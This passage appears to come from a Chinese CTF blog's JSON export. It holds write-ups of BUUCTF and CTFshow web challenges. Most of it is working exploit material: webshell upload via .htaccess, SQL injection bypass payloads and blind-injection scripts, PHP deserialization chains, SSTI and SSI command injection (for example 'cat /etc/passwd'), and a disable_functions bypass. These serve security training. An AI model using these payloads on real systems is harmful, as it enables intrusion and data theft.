22.29.11.png)\n\n在查找tornado获取环境变量在handler.settings中，直接构造\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-28 22.31.47.png)\n\n在按照hints中内容构造hash即可\n\n```\npayload:file?filename=/fllllllllllllag&filehash=da1ca88f71d944d0819a420a222fc69c\n```\n\n## [MRCTF2020]你传你🐎呢\n\nApache解析漏洞\n\n```\n#.htaccess\n<FilesMatch \"shell.png\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\n\n上传后蚁剑连接即可\n\n## [BJDCTF2020]ZJCTF，不过如此\n\n先看代码\n\n```php\n//index.php\n<?php\nerror_reporting(0);\n$text = $_GET[\"text\"];\n$file = $_GET[\"file\"];\nif(isset($text)&&(file_get_contents($text,'r')===\"I have a dream\")){\n    echo \"<br><h1>\".file_get_contents($text,'r').\"</h1></br>\";\n    if(preg_match(\"/flag/\",$file)){\n        die(\"Not now!\");\n    }\n    include($file);  //next.php\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n构造先读取next.php中的内容\n\n```\n?file=php://filter/read=convert.base64-encode/resource=next.php&text=php://input\nPOST:\nI have a dream\n```\n\n```php\n//next.php\n<?php\n$id = $_GET['id'];\n$_SESSION['id'] = $id;\n\nfunction complex($re, $str) {\n    return preg_replace(\n        '/(' . $re . ')/ei',\n        'strtolower(\"\\\\1\")',\n        $str\n    );\n}\n\n\nforeach($_GET as $re => $str) {\n    echo complex($re, $str). \"\\n\";\n}\n\nfunction getFlag(){\n\t@eval($_GET['cmd']);\n}\n\n```\n\n这时候要用一个正则的漏洞[Preg_Replace代码执行漏洞解析](https://www.cesafe.com/html/6999.html)\n\n构造出正则内容为\n\nre=\\S*（多次匹配非空字符）\n\nstr=${phpinfo()}\n\n测试成功\n\n进而使用getFlag函数执行命令\n\n```\npayload:next.php?\\S*={${getFlag()}}&cmd=system('cat /flag');\n```\n\n## [De1CTF 2019]SSRF Me\n\n上来就是代码\n\n```python\n#! /usr/bin/env python\n# #encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\n\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if (not os.path.exists(self.sandbox)):\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print resp\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n\n\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\n\n\n@app.route('/De1ta', methods=['GET', 'POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if (waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n\n\n@app.route('/')\ndef index():\n    return open(\"code.txt\", \"r\").read()\n\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\n\ndef waf(param):\n    check = param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\n\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0', port=9999)\n\n\n```\n\n看代码关键点就是`Task`类中的函数执行，分析得出只要`action`中同时含有scan和read即可读取出文件并返回，而在`De1ta`路径中有创建`Task`类的过程，`geneSign`路径中可以获取sign值，所以让`action=scanread&parma=flag.txt`，通过`geneSign`路径获取sign即可，`getSign`函数中md5内容的拼接，是`secert_key + param + action`，而对于`geneSign`路径来说，action永远为scan，所以geneSign结果就是`secert_key + param + 'scan'`拼接出带有同时带有scan和read只要让`param=flag.txtread`即可，传入`geneSign`拿到sign值\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-29 15.50.50.png)\n\n最终payload如下\n\n```\npayload:De1ta?param=flag.txt\nCookie: action=readscan;sign=1983e9273c0ae452b67ccecb2fb88ed2;\n```\n\n## [网鼎杯 2020 朱雀组]Nmap\n\n详见该题：[BUUCTF 2018]Online Tool\n\n\n\n## [SWPU2019]Web1\n\n是SQL注入\n\n1、空格过滤\n\n2、注释符过滤\n\n3、[information_schema绕过](https://www.anquanke.com/post/id/193512)\n\n4、无列名注入\n\n第一个用/**/绕过就行\n\n第二个末尾加单引号闭合就行\n\n最后一个使用innodb引擎绕过\n\n条件是MySQL版本>5.5\n\n表名在innodb_table_stats\n\n列名在innodb_table_index\n\nselect table_name from mysql.innodb_table_stats where database_name=database()\n\n首先是测试列数，为22列，回显在2，3位，然后爆表名\n\n```\n-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)from(mysql.innodb_table_stats)where(database_name=database())),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n```\n\n表名：ads，users\n\n无列名注入\n\n```text\nselect 1,2,3 union select * from admin;\n```\n\n这样的话union select的内容就是前三列的内容\n\n```text\nselect `3` from (select 1,2,3 union select * from admin)a;\n```\n\n或者\n\n```\nselect b from (select 1,2,3 as b union select * from admin)a;\n```\n\n这样就是第三列的内容\n\n```\npayload:-1'/**/union/**/select/**/1,(select/**/group_concat(b)from(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n```\n\n## [MRCTF2020]Ezpop\n\n```PHP\nWelcome to index.php\n<?php\n//flag is in flag.php\n//WTF IS THIS?\n//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\n//And Crack It!\nclass Modifier {\n    protected $var;\n    public function append($value){\n        include($value);\n    }\n    public function __invoke(){\n        $this->append($this->var);\n    }\n}\nclass Show{\n    public $source;\n    public $str;\n    public function __construct($file='index.php'){\n        $this->source = $file;\n        echo 'Welcome to '.$this->source.\"<br>\";\n    }\n    public function __toString(){\n        return $this->str->source;\n    }\n    public function __wakeup(){\n        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker\";\n            $this->source = \"index.php\";\n        }\n    }\n}\nclass Test{\n    public $p;\n    public function __construct(){\n        $this->p = array();\n    }\n\n    public function __get($key){\n        $function = $this->p;\n        return $function();\n    }\n}\n\nif(isset($_GET['pop'])){\n    @unserialize($_GET['pop']);\n}\nelse{\n    $a=new Show;\n    highlight_file(__FILE__);\n}\n?>\n```\n\n反序列化不用多说，最后应该文件包含加PHP伪协议读取，找链子\n\n`__invoke`需要以函数调用类，在Test的`__get`方法中，`__get`方法在Show中`__toString`调用类中不存在的方法时会被调用，最终构造出的就是\n\n```PHP\n<?php\nclass Modifier{\n    protected $var = 'php://filter/read=convert.base64-encode/resource=flag.php';\n}\nclass Show{\n    public $source;\n    public $str;\n    public function __construct($file)\n    {\n        $this->source = $file;\n    }\n    public function __toString(){\n        return \"output anything you want\";\n    }\n}\nclass Test{\n    public $p;\n}\n$payload = new Show('test');\n$payload->str = new Test();\n$payload->str->p = new Modifier();\n$hack = new Show($payload);\necho urlencode(serialize($hack));\n?>\n```\n\n内容base64解码即可\n\n## [NPUCTF2020]ReadlezPHP\n\n查看源代码，发现了时间显示所使用的./time.php?source\n\n```PHP\n<?php\n#error_reporting(0);\nclass HelloPhp\n{\n    public $a;\n    public $b;\n    public function __construct(){\n        $this->a = \"Y-m-d h:i:s\";\n        $this->b = \"date\";\n    }\n    public function __destruct(){\n        $a = $this->a;\n        $b = $this->b;\n        echo $b($a);\n    }\n}\n$c = new HelloPhp;\n\nif(isset($_GET['source']))\n{\n    highlight_file(__FILE__);\n    die(0);\n}\n\n@$ppp = unserialize($_GET[\"data\"]);\n?>\n```\n\n反序列化构造出以b为函数名，以a为参数的函数执行即可，尝试system发现没有回显，可能是被过滤，再尝试eval，也被过滤，放弃执行系统命令，尝试执行php函数，使用assert包裹phpinfo()，查找flag成功\n\n## [CISCN2019 华东南赛区]Web11\n\n在XFF位置尝试SSTI成功，输入{{config}}报错发现使用的是smarty渲染，{system('ls /')}发现flag，{system('cp /flag /var/www/html/flag.txt')}将文件带出即可\n\n## [极客大挑战 2019]FinalSQL\n\n点提示发现注入点，过滤了空格，还是数字型注入，使用布尔盲注\n\n```\n爆库名：\nid=2^(ascii(substr((select(database())),{i},1))={ord(j)})\n正确返回3，错误返回2\n爆表名\nid=2^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),{i},1))={ord(j)})\n爆列名\nid=2^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),{i},1))={ord(j)})\n```\n\n最终payload脚本\n\n```\nimport requests\nurl=\"http://93af0548-22e2-4a84-8fd6-3a78dfdda8f3.node4.buuoj.cn:81/search.php\"\nname=\",QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890\"\nflag=\"flag{1234567890-bcde},\"\nfor i in range(1,100):\n    for j in flag:\n        parma={\n            'id':f\"2^(ascii(substr((select(group_concat(password))from(F1naI1y)where(username='flag')),{i},1))={ord(j)})\"\n        }\n        tex=requests.get(url,params=parma).text\n        if \"Ohhh You find the flag read on!\" in tex:\n            print(j,end='')\n            break\n```\n\n## [0CTF 2016]piapiapia\n\n没啥内容先扫目录，www.zip扫出源码，发现有隐藏的注册页面，先进行注册和登录，然后再查看源码\n\n```PHP\nindex.php和register.php一个登录一个注册\nclass.php关键函数\npublic function filter($string) {\n\t$escape = array('\\'', '\\\\\\\\');\n\t$escape = '/' . implode('|', $escape) . '/';\n\t$string = preg_replace($escape, '_', $string);\n\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t$safe = '/' . implode('|', $safe) . '/i';\n\treturn preg_replace($safe, 'hacker', $string);\n}\nupdate.php更新个人信息内容\nif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\t$username = $_SESSION['username'];\n\tif(!preg_match('/^\\d{11}$/', $_POST['phone']))\n\t\tdie('Invalid phone');\n\n\tif(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n\t\tdie('Invalid email');\n\t\n\tif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n\t\tdie('Invalid nickname');\n\n\t$file = $_FILES['photo'];\n\tif($file['size'] < 5 or $file['size'] > 1000000)\n\t\tdie('Photo size error');\n\n\tmove_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n\t$profile['phone'] = $_POST['phone'];\n\t$profile['email'] = $_POST['email'];\n\t$profile['nickname'] = $_POST['nickname'];\n\t$profile['photo'] = 'upload/' . md5($file['name']);\n\t$user->update_profile($username, serialize($profile));\n\techo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n}\nprofile.php\n$profile = unserialize($profile);\n$phone = $profile['phone'];\t\t\n$email = $profile['email'];\n$nickname = $profile['nickname'];\n$photo = base64_encode(file_get_contents($profile['photo']));//关键，如果其中photo文件名是config.php即可读取到flag\n```\n\n反序列化字符逃逸漏洞：\n\n```\n原始序列化字符串：\na:1:{s:5:\"phone\";s:5:\"where\";}\n此时读取到的内容是phone=where\n将字符串进行过滤，preg_replace('where', 'hacker', $string);\n序列化后字符串变为\na:1:{s:5:\"phone\";s:5:\"hacker\";}\n此时反序列化只读取前5位，hacke，后面的r就属于逃逸的字符了，那么如果我们构造出一个能逃逸足够长的字符的字符串，就可以让序列化后的字符串存入我们需要的内容，在本题中我们想要传入的是s:5:\"photo\";s:10:\"config.php\";}，而又因为我们需要对nickname的内容进行绕过，此时nickname是一个数组所以我们最终需要逃逸的字符串就是\"}s:5:\"photo\";s:10:\"config.php\";}，所以最后构造payload使用关键字where，替换为hacker后能溢出，上面字符串有34个字符那么我们传入34个where+字符串即可\n```\n\npayload\n\n```\nnickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}\n```\n\n## [BJDCTF2020]EasySearch\n\n扫描，得到index.php.swp\n\n```PHP\n<?php\n\tob_start();\n\tfunction get_hash(){\n\t\t$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';\n\t\t$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times\n\t\t$content = uniqid().$random;\n\t\treturn sha1($content); \n\t}\n    header(\"Content-Type: text/html;charset=utf-8\");\n\t***\n    if(isset($_POST['username']) and $_POST['username'] != '' )\n    {\n        $admin = '6d0bc1';\n        if ( $admin == substr(md5($_POST['password']),0,6)) {\n            echo \"<script>alert('[+] Welcome to manage system')</script>\";\n            $file_shtml = \"public/\".get_hash().\".shtml\";\n            $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");\n            $text = '\n            ***\n            ***\n            <h1>Hello,'.$_POST['username'].'</h1>\n            ***\n\t\t\t***';\n            fwrite($shtml,$text);\n            fclose($shtml);\n            ***\n\t\t\techo \"[!] Header  error ...\";\n        } else {\n            echo \"<script>alert('[!] Failed')</script>\";\n            \n    }else\n    {\n\t***\n    }\n\t***\n?>\n```\n\n要求password经过md5处理后前六位是6d0bc1\n\n贴一个爆破的脚本\n\n```python\nimport hashlib\nfor i in range(1000000000):\n    a = hashlib.md5(str(i).encode('utf-8')).hexdigest()\n    if a[0:6] == '6d0bc1':\n        print(i)\n        print(a)\n```\n\n抓包发现响应头中\n\n```\nUrl_is_here: public/11b26335b1b3d0a88c6ec7333d2f5f522d1237f2.shtml\n```\n\n访问尝试XFF SSTI失败，看看wp吧，是SSI注入漏洞\n\n```\nSSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。\n\nSSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。\n\n从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。\n```\n\n首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用#include引用进来。\n\n**①显示服务器端环境变量<#echo>**\n\n本文档名称：\n\n`<!–#echo var=\"DOCUMENT_NAME\"–>`\n\n现在时间：\n\n`<!–#echo var=\"DATE_LOCAL\"–>`\n\n显示IP地址：\n\n`<! #echo var=\"REMOTE_ADDR\"–>`\n\n**②将文本内容直接插入到文档中<#include>**\n\n`<! #include file=\"文件名称\"–>`\n\n`<!--#include virtual=\"index.html\" -->`\n\n`<! #include virtual=\"文件名称\"–>`\n\n`<!--#include virtual=\"/www/footer.html\" -->`\n\n注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径\n\n**③显示WEB文档相关信息<#flastmod><#fsize>(如文件制作日期/大小等)**\n\n文件最近更新日期：\n\n`<! #flastmod file=\"文件名称\"–>`\n\n文件的长度：\n\n`<!–#fsize file=\"文件名称\"–>`\n\n**④直接执行服务器上的各种程序<#exec>(如CGI或其他可执行程序)**\n\n`<!–#exec cmd=\"文件名称\"–>`\n\n`<!--#exec cmd=\"cat /etc/passwd\"-->`\n\n`<!–#exec cgi=\"文件名称\"–>`\n\n`<!--#exec cgi=\"/cgi-bin/access_log.cgi\"–>`\n\n将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。\n\n**⑤设置SSI信息显示格式<#config>(如文件制作日期/大小显示方式**)\n\n**⑥高级SSI可设置变量使用if条件语句。**\n\n所以我们传入`<!–#exec cmd=\"系统命令\"–>`即可执行系统命令，password内容已确定，只能通过username传入\n\n```\npayload:\nPOST\nusername=<!--#exec cmd=\"cat ../flag_990c66bf85a09c664f0b6741840499b2\"-->&password=2020666\n```\n\n## [GYCTF2020]FlaskApp\n\n解密处SSTI\n\n过滤了*，system，os\n\n试试读取文件源码，找到了黑名单\n\n`black_list = [\"flag\",\"os\",\"system\",\"popen\",\"import\",\"eval\",\"chr\",\"request\", \"subprocess\",\"commands\",\"socket\",\"hex\",\"base64\",\"*\",\"?\"]`\n\n使用加号绕过，遍历根目录\n\n`{{url_for.__globals__[\"o\"+\"s\"].listdir('/')}}`\n\n发现`this_is_the_flag.txt`文件\n\n`{{url_for.__globals__['__builtins__'].open('/this_is_the_f' + 'lag.txt','r').read()}}`\n\n拿到flag\n\n## [BSidesCF 2019]Kookie\n\n```\nCookie: username=admin\n```\n\n## [极客大挑战 2019]RCE ME\n\n```php\n<?php\nerror_reporting(0);\nif(isset($_GET['code'])){\n\t$code=$_GET['code'];\n\tif(strlen($code)>40){\n\t\tdie(\"This is too Long.\");\n\t}\n\tif(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n\t\tdie(\"NO.\");\n\t}\n\t@eval($code);\n}\nelse{\n\thighlight_file(__FILE__);\n}\n?>\n```\n\n取反绕过，先试试phpinfo\n\n```\ncode=(~%8F%97%8F%96%91%99%90)();\n```\n\n禁用大量系统命令执行函数，构造eval使用蚁剑\n\n```\ncode=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6);\n//assert((eval($_POST[a])))\n```\n\n发现读不到flag，看wp，是一个PHP7的禁用函数绕过漏洞\n\n```\n这里用工具\n地址https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\n由于在/var/tmp目录 有上传权限，可以上传bypass_disablefun_x64.so和bypass_disablefunc.php（重命名为shell.php），\n```\n\n```\n然后需要构造一个新的payload:\n根据“?code=${*GET}[_](https://www.cnblogs.com/yunqian2017/p/${_GET}[_]);&*=assert&_=eval($_POST['a'])”\n使用的是异或绕过，\n最后的payload是\n```\n\n```\ncode=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=include(%27/var/tmp/shell.php%27)&cmd=/readflag&outpath=/tmp/tmpfile&sopath=/var/tmp/bypass_disablefunc_x64.so\n```\n\n## [MRCTF2020]套娃\n\n查看源码\n\n```PHP\n$query = $_SERVER['QUERY_STRING'];\nif(substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){\n\tdie('Y0u are So cutE!');\n}\nif($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){\n\techo \"you are going to the next ~\";\n}\n```\n\n要求传参变量名为`b_u_p_t`又要求队列字符串中不能有下划线，可以使用空格绕过，而匹配起始结尾都要有23333，使用换行绕过\n\n```\n?b u p t=23333%0A\n```\n\n查看源码，发现有brainfuck注释内容，在控制台执行，发现需要POST传参Merak，传入后查看代码\n\n```PHP\n<?php \nerror_reporting(0); \ninclude 'takeip.php';\nini_set('open_basedir','.'); \ninclude 'flag.php';\nif(isset($_POST['Merak'])){ \n    highlight_file(__FILE__); \n    die(); \n} \nfunction change($v){ \n    $v = base64_decode($v); \n    $re = ''; \n    for($i=0;$i<strlen($v);$i++){ \n        $re .= chr ( ord ($v[$i]) + $i*2 ); \n    } \n    return $re; \n}\necho 'Local access only!'.\"<br/>\";\n$ip = getIp();\nif($ip!='127.0.0.1')\necho \"Sorry,you don't have permission!  Your ip is :\".$ip;\nif($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){\necho \"Your REQUEST is:\".change($_GET['file']);\necho file_get_contents(change($_GET['file'])); }\n?> \n```\n\nip匹配绕过使用Client-ip请求头，file_get_contents使用data伪协议传入\n\n```\n?2333=data:text/plain,todat is a happy day&file=ZmpdYSZmXGI=\n```\n\n查看源码得到flag\n"},{"title":"CTFshow_观星","url":"/posts/21090.html","content":"\n上来就很明显了，是sql注入，尝试单引号闭合\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-12 22.17.52.png)\n\n被过滤了\n\n测试后发现过滤内容如下：\n\n```\n该字符是非法字符: union\n该字符是非法字符: and\n该字符是非法字符: sleep\n该字符是非法字符: limit\n该字符是非法字符: by\n该字符是非法字符: like\n该字符是非法字符: char\n该字符是非法字符: ascii\n该字符是非法字符: handler\n该字符是非法字符: benchmark\n该字符是非法字符: '\n该字符是非法字符: \"\n该字符是非法字符: ~\n该字符是非法字符: `\n该字符是非法字符: =\n该字符是非法字符: 空格\n```\n\n常规的sql盲注payload大致为：id=1^if(ascii(substr(database(),1,1))=102,2,3)\n\n1^2=3\n\n1^3=2\n\n到此，给出一些绕过方法，首先是空格可以使用括号或者/**/代替，然后ascii可以使用ord代替，substr中的逗号可以使用substr(字符串 from 1 for 1)来代替使用，if中的逗号可以为使用case语句代替，等于号和like可以用regexp代替，最终替换出的语句如下\n\nid=1^case(ord(substr(database()from({i})for(1))))when({ord(j)})then(2)else(3)end\n\n脚本如下：\n\n```python\n#CTFshow_观星.py\nimport requests\n\nurl = \"http://411c2277-fdd1-4c6d-a294-dddbb8c3579d.challenge.ctf.show/?id=\"\nflagchar = \"ctfshow-{},abde1234567890\"\nnamechar = \"flag,ctfshow_qwertyuiopasdfghjklzxcvbnm1234567890\"\nfor i in range(1, 50):\n    for j in flagchar:\n        #payload=f\"1^case(ord(substr(database()from({i})for(1))))when({ord(j)})then(2)else(3)end\" 库名：web1\n        #payload=f\"1^case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp(database()))from({i})for(1))))when({ord(j)})then(2)else(3)end\" 表名：flag\n        #payload=f\"1^case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema)regexp(database()))from({i})for(1))))when({ord(j)})then(2)else(3)end\" 列名：flag\n        payload = f\"1^case(ord(substr((select(group_concat(flag))from(flag))from({i})for(1))))when({ord(j)})then(2)else(3)end\"\n        tex=requests.get(url=url+payload).text\n        if \"I asked nothing\" in tex:\n            print(j,end='')\n            break\n\n```\n\n"},{"title":"CTFshowSQL注入","url":"/posts/38885.html","content":"\n**171**\n\n入门开始，直接union select\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user\n0' union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+\n```\n\n**172**\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user2\n0' union select 1,group_concat(password) from ctfshow_web.ctfshow_user2 --+\n```\n\n**173**\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user3\n0' union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user3 --+\n```\n\n**174**\n\n返回内容中不能有数字了，试试布尔注入吧\n\nselect * from tableName limit i,n\n\ni为索引，n为数量\n\n随便写的垃圾脚本\n\n```python\nimport requests\nurl=\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1=     &page=1&limit=10\"\nfor i in range(1,1000):\n    for j in range(45,57):\n        sql = f\"if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))={j},1,0)\"\n        url=f\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        tex=requests.get(url).text\n        if 'admin' in tex:\n            print(chr(j),end='')\n    for j in range(97,125):\n        sql = f\"if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))={j},1,0)\"\n        url=f\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        tex=requests.get(url).text\n        if 'admin' in tex:\n            print(chr(j),end='')\n```\n\n**175**\n\n啥都没了时间盲注\n\n```python\nimport requests\nurl=\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1&page=1&limit=10\"\nfor i in range(1,1000):\n    for j in range(45, 57):\n        sql = f\"if(ascii(substr((select password from ctfshow_user5 limit 24,1),{i},1))={j},sleep(2),0)\"\n        url = f\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        try:\n            requests.get(url=url, timeout=1)\n        except Exception as e:\n            print(chr(j), end='')\n    for j in range(97,125):\n        sql = f\"if(ascii(substr((select password from ctfshow_user5 limit 24,1),{i},1))={j},sleep(2),0)\"\n        url=f\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        try:\n            requests.get(url=url,timeout=1)\n        except Exception as e:\n            print(chr(j), end='')\n\n```\n\n或者试试文件读写\n\n```\n1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt' --+\n```\n\n**176**\n\n过滤了union select，大小写绕过或万能密码`1' or 1=1--+`\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user\n0' unIon sElEct 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+\n```\n\n**177**\n\n过滤了空格，/**/即可，不能用+，url会被转成空格\n\n```\n0'/**/union/**/select/**/1,2,group_concat(password)/**/from/**/ctfshow_user%23\n```\n\n**178**\n\n过滤了空格和*，制表符%09绕过\n\n```\n0'%09union%09select%091,2,group_concat(password)%09from%09ctfshow_user%23\n```\n\n**179**\n\n%09也没了，还剩%0c\n\n```\n0'%0cunion%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%23\n```\n\n**180**\n\n真没招了，看看wp，通过反引号分割，绝\n\n```\n0'union%0cselect'1',(select`password`from`ctfshow_user`where`username`='flag'),'3\n```\n\n还有\n\n```\n0'or(id=26)and'1'='1\n```\n\n**181**\n\nselect不见了，万能密码\n\n```\n0'%0cor%0cid='26\n```\n\n**182**\n\nflag不见了，其实不影响上面的，但是还是可以尝试模糊匹配\n\n```\n0'%0cor%0cusername%0clike%0c'%fla%\n```\n\n**183**\n\n使用正则表达式和布尔盲注\n\n```\nWHERE email REGEXP 'a'\n```\n\n意思是在email中匹配a的\n\n写脚本咯\n\n```python\nimport requests\nurl = 'http://24a744c9-dd02-415a-b46b-68e87b328edd.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"(ctfshow_user)where(substr(pass,{i},1))regexp('{j}')\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 1;\" in tex:\n        \tprint(j,end='')\n```\n\n**184**\n\nRIGHT JOIN 关键字会右表 (table_name2) 那里返回所有的行，即使在左表 (table_name1) 中没有匹配的行。\n\n```\nSELECT column_name(s)\nFROM table_name1\nRIGHT JOIN table_name2\n```\n\n我们将匹配后的表作为右表，使用正则查询即可\n\n`ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({ord(j)})))`\n\n```python\nimport requests\nurl = 'http://cf6d0357-c567-4db6-9fab-5827e7d5e40d.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({ord(j)})))\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 43;\" in tex:\n            print(j,end='')\n            break\n\n```\n\n记得问on是啥意思\n\n**185**\n\n过滤了数字，用true=1相加构造数字咧\n\n```python\nimport requests\nurl = 'http://7cdec59f-0059-4f5d-ac07-fcac41696822.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\ndef lo(x):\n    tmp=\"true\"\n    for i in range(1,x):\n        tmp=tmp+\"+true\"\n    return tmp\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,({lo(i)}),(true))regexp(char({lo(ord(j))})))\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 43;\" in tex:\n            print(j,end='')\n            